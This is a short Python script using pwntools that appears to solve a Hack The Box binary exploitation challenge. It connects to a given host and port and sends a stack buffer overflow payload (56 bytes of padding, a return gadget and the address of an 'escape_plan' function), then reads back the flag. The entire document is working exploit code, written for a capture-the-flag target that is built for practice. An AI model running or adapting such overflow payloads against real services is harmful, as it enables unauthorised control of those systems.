#!/usr/bin/python3
from pwn import *

if len(sys.argv) < 2:
    log.failure(f"Uso: python3 {sys.argv[0]} <host:port>")
    sys.exit(1)

host, port = sys.argv[1].split(":")
shell = remote(host, port)

offset = 56
junk = b"A" * offset

ret = p64(0x401016)
escape_plan = p64(0x401255)

payload = junk + ret + escape_plan

shell.sendline(b"69")
shell.sendline(payload)

flag = shell.recvline_contains(b"HTB").strip().decode()
log.success(f"Flag: {flag}")
